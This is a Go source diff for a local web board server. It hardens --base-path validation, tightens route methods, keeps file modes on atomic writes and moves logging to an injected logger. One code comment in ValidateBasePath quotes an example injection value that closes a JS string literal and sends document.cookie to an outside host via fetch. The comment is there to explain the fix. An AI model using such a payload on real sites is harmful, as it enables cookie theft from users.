@@ -36,14 +36,14 @@ import (
 	"fmt"
 	"io"
 	"io/fs"
-	"log"
 	"math"
+	"math/rand/v2"
 	"mime"
 	"net"
 	"net/http"
 	"os"
 	"path"
-	"path/filepath"
+	"regexp"
 	"runtime/debug"
 	"strconv"
 	"strings"
@@ -154,12 +154,55 @@ func NormalizeBasePath(raw string) string {
 	return "/" + trimmed
 }
 
+// basePathRe is what a URL prefix may contain: one or more `/segment`, each
+// segment made of the characters a path segment can hold without being escaped.
+// A segment must contain at least one character that is not a dot, so `.` and
+// `..` are refused — dots are in the class because `v1.2` is a reasonable
+// prefix, and that is exactly what lets `..` through if nothing says otherwise.
+var basePathRe = regexp.MustCompile(`^(/[A-Za-z0-9._~-]*[A-Za-z0-9_~-][A-Za-z0-9._~-]*)+$`)
+
+// ValidateBasePath refuses a --base-path that cannot be one.
+//
+// This is not hygiene. `serveShell` splices the normalised value into the shell
+// as `window.ABOARD_BASE = "<base>";` — inside a JS STRING LITERAL — and
+// NormalizeBasePath only trimmed slashes, so a `"` closed the literal and
+// everything after it ran on the board's own origin:
+//
+//	--base-path '/brd";fetch("http://elsewhere/?"+document.cookie)//'
+//
+// The flag belongs to whoever starts the server, so this is not a route in from
+// outside; it is the shape of thing that becomes one the moment a wrapper builds
+// the flag from something it read. Refused up front, as ValidateBoardName is,
+// rather than escaped at the splice: a base path with a quote in it is not a
+// base path, and there is exactly one place that decides so.
+//
+// `..` is refused by the same rule, since a segment of dots is not in the
+// character class. A prefix containing `..` is not a traversal — the router
+// strips it as a literal — but it is nonsense that would have to be explained.
+func ValidateBasePath(raw string) error {
+	base := NormalizeBasePath(raw)
+	if base == "" {
+		return nil
+	}
+	if !basePathRe.MatchString(base) {
+		return fmt.Errorf("base path %q is not usable: it must be one or more /segments of letters, digits, %s",
+			raw, "dot, underscore, tilde or hyphen, and no segment may be `.` or `..` — for example /aboard")
+	}
+	return nil
+}
+
 // Serve runs the board until the context is cancelled or the server fails.
 //
 // Everything it needs is in cfg and opts: it reads no flags, no environment and
 // no os.Args, which is what lets ape mount the same call behind its own command.
 func Serve(ctx context.Context, opts Options, cfg ServeConfig) error {
 	logger := opts.Log()
+
+	// Before anything binds or is written: an unusable base path would otherwise
+	// reach serveShell's splice.
+	if err := ValidateBasePath(cfg.BasePath); err != nil {
+		return err
+	}
 
 	stateFile := cfg.StateFile
 	if stateFile == "" {
@@ -199,11 +242,12 @@ func Serve(ctx context.Context, opts Options, cfg ServeConfig) error {
 		if dir == "" {
 			dir = cfg.Root.DevDir()
 		}
-		// The one path join outside layout.go, and deliberately: --dev-dir names a
-		// tree that need not be under the project root at all, so Root has no
-		// opinion about it. Probing for aboard.html turns "--dev silently served
-		// nothing" into a message that names the directory it looked in.
-		if _, err := os.Stat(filepath.Join(dir, "aboard.html")); err != nil {
+		// --dev-dir names a tree that need not be under the project root at all,
+		// so Root has no opinion about it — but the join still goes through
+		// layout.go, which is the only file that joins a path. Probing for
+		// aboard.html turns "--dev silently served nothing" into a message that
+		// names the directory it looked in.
+		if _, err := os.Stat(DevWebFile(dir, "aboard.html")); err != nil {
 			return fmt.Errorf("--dev found no web tree at %s (pass --dev-dir)", dir)
 		}
 		assets = os.DirFS(dir)
@@ -585,7 +629,7 @@ func (s *server) routeAPI(w http.ResponseWriter, r *http.Request, upath string) 
 	case upath == "/aboard.json" && r.Method == http.MethodPost:
 		s.postState(w, r)
 	case upath == "/health" && r.Method == http.MethodGet:
-		writeJSON(w, http.StatusOK, s.instance)
+		s.writeJSON(w, http.StatusOK, s.instance)
 	case upath == "/events" && r.Method == http.MethodGet:
 		s.events(w, r)
 	case upath == "/wait" && r.Method == http.MethodGet:
@@ -618,7 +662,12 @@ func (s *server) routeAPI(w http.ResponseWriter, r *http.Request, upath string) 
 // frame, an uploaded image, and the embedded (or --dev on-disk) assets.
 func (s *server) routeUI(w http.ResponseWriter, r *http.Request, upath string) {
 	switch {
-	case upath == "/" || upath == "/aboard.html":
+	// GET, like every other case here. It had no method check at all, so
+	// `POST /` returned the whole shell with a 200 — harmless, since nothing in
+	// the browser executes anything, but it made the reference's "any method not
+	// listed for a matched path is 404" false, and a rule with a known exception
+	// is one nobody trusts the rest of.
+	case (upath == "/" || upath == "/aboard.html") && r.Method == http.MethodGet:
 		s.serveShell(w, r)
 	case strings.HasPrefix(upath, "/tab/") && strings.HasSuffix(upath, "/html") && r.Method == http.MethodGet:
 		id := strings.TrimSuffix(strings.TrimPrefix(upath, "/tab/"), "/html")
@@ -648,7 +697,7 @@ func (s *server) getState(w http.ResponseWriter) {
 func (s *server) postState(w http.ResponseWriter, r *http.Request) {
 	raw, err := io.ReadAll(http.MaxBytesReader(w, r.Body, maxBodyBytes))
 	if err != nil {
-		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "body too large or unreadable"})
+		s.writeJSON(w, http.StatusBadRequest, map[string]string{"error": "body too large or unreadable"})
 		return
 	}
 
@@ -657,11 +706,11 @@ func (s *server) postState(w http.ResponseWriter, r *http.Request) {
 	// and it keeps diffs stable between writes.
 	var incoming map[string]any
 	if err := json.Unmarshal(raw, &incoming); err != nil {
-		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid json"})
+		s.writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid json"})
 		return
 	}
 	if _, ok := incoming["tabs"].([]any); !ok {
-		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "expected a tabs array"})
+		s.writeJSON(w, http.StatusBadRequest, map[string]string{"error": "expected a tabs array"})
 		return
 	}
 
@@ -675,7 +724,7 @@ func (s *server) postState(w http.ResponseWriter, r *http.Request) {
 		// ignored. Ignoring it is the whole defect this token exists to close:
 		// the caller believes it asked for compare-and-set, the server silently
 		// did not, and the 200 says the write was fine.
-		writeJSON(w, http.StatusBadRequest, map[string]string{
+		s.writeJSON(w, http.StatusBadRequest, map[string]string{
 			"error":  "invalid __base",
 			"reason": "__base must be the `rev` of the document you read, as a number or its decimal string",
 		})
@@ -707,7 +756,7 @@ func (s *server) postState(w http.ResponseWriter, r *http.Request) {
 
 	res, bad := s.commitState(incoming, raw, base, by, origin)
 	if bad != nil {
-		writeJSON(w, bad.code, bad.body)
+		s.writeJSON(w, bad.code, bad.body)
 		return
 	}
 
@@ -724,7 +773,7 @@ func (s *server) postState(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
-	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "rev": res.rev, "updatedAt": res.stamp})
+	s.writeJSON(w, http.StatusOK, map[string]any{"ok": true, "rev": res.rev, "updatedAt": res.stamp})
 }
 
 // commitResult is what an accepted write hands back to the unlocked half of
@@ -783,7 +832,7 @@ func (s *server) commitState(incoming map[string]any, raw []byte, base, by, orig
 
 	// Tab-level guarantees: an agent may not delete a tab or clear a change
 	// marker, and every tab it did change gets stamped so the UI can show a dot.
-	tabs, err := reconcileTabs(currentRaw, raw, by)
+	tabs, err := reconcileTabs(currentRaw, raw, by, s.opts.Log())
 	if err != nil {
 		return commitResult{}, &apiError{http.StatusBadRequest, map[string]string{"error": err.Error()}}
 	}
@@ -959,8 +1008,32 @@ func (v revision) refuse(base string) *apiError {
 
 // Write via a temp file in the same directory, then rename. A reader (Claude
 // Code, or another browser) therefore never observes a half-written file.
+//
+// THE MODE IS PART OF THE CONTRACT, and this got it wrong for as long as it
+// used os.CreateTemp: that creates at 0600 and the rename carries the mode with
+// it, so the state file `aboard init` wrote at 0644 silently dropped to 0600 on
+// the server's first accepted write. The board's whole purpose is to be read by
+// the tools the developer already runs — their editor, a VS Code extension,
+// every other agent session — and 0600 is the mode for a service holding other
+// people's secrets, which this is not (see the file-mode note in init.go).
+//
+// Two rules, in this order:
+//
+//   - A file that already exists keeps ITS mode. If somebody chose 0600 for
+//     their own board, an ordinary write is not the place to overrule them.
+//   - A new file is created 0o644 THROUGH THE UMASK, by asking the kernel for
+//     that mode rather than chmod-ing afterwards. os.OpenFile applies the umask;
+//     os.Chmod does not, and would hand a 0077 user a world-readable file they
+//     had explicitly asked not to have. This is also why there is no
+//     syscall.Umask call here: that is Unix-only, and this tree cross-compiles
+//     for Windows.
 func (s *server) writeAtomic(body []byte) error {
-	tmp, err := os.CreateTemp(filepath.Dir(s.stateFile), ".aboard-*.json")
+	mode := os.FileMode(0o644)
+	if info, err := os.Stat(s.stateFile); err == nil {
+		mode = info.Mode().Perm()
+	}
+
+	tmp, err := createTempFile(s.stateFile, mode)
 	if err != nil {
 		return err
 	}
@@ -975,6 +1048,30 @@ func (s *server) writeAtomic(body []byte) error {
 		return err
 	}
 	return os.Rename(tmpName, s.stateFile)
+}
+
+// createTempFile is os.CreateTemp with a mode, which os.CreateTemp does not
+// take — it is hard-wired to 0600. O_EXCL makes the name race-free exactly as
+// CreateTemp's own loop does; the mode goes through the umask because the kernel
+// applies it to O_CREATE.
+func createTempFile(dest string, mode os.FileMode) (*os.File, error) {
+	var lastErr error
+	for range 100 {
+		// math/rand, not crypto/rand, and deliberately: O_EXCL is what makes the
+		// name safe, exactly as it is in os.CreateTemp's own loop. The number only
+		// has to avoid a collision with a concurrent write in the same directory,
+		// and the loop below handles the collision if it happens.
+		name := TempFileBeside(dest, rand.Uint64()) //nolint:gosec // G404: O_EXCL provides the safety; this only avoids a retry
+		f, err := os.OpenFile(name, os.O_RDWR|os.O_CREATE|os.O_EXCL, mode)
+		if err == nil {
+			return f, nil
+		}
+		if !os.IsExist(err) {
+			return nil, err
+		}
+		lastErr = err
+	}
+	return nil, lastErr
 }
 
 /* ---------- live reload ---------- */
@@ -1213,7 +1310,12 @@ func (s *server) writeAsset(w http.ResponseWriter, r *http.Request, name string,
 	_, _ = w.Write(body)
 }
 
-func writeJSON(w http.ResponseWriter, code int, payload any) {
+// writeJSON is a METHOD, and that is the whole reason it changed shape: the one
+// line it logs went to the standard logger, which a host embedding this tree has
+// no way to redirect. Every caller was already a *server, so the receiver costs
+// nothing and closes the last hole in "server logging goes through
+// Options.Logger" (aboard.go).
+func (s *server) writeJSON(w http.ResponseWriter, code int, payload any) {
 	w.Header().Set("Content-Type", "application/json")
 	w.Header().Set("Cache-Control", "no-store")
 	w.WriteHeader(code)
@@ -1222,6 +1324,6 @@ func writeJSON(w http.ResponseWriter, code int, payload any) {
 		// change and the client sees a truncated body. Log it: a handler that
 		// cannot serialise its own reply is a bug, and silence is how it stays
 		// one.
-		log.Printf("writeJSON: encoding a %d reply: %v", code, err)
+		s.opts.Log().Printf("writeJSON: encoding a %d reply: %v", code, err)
 	}
 }
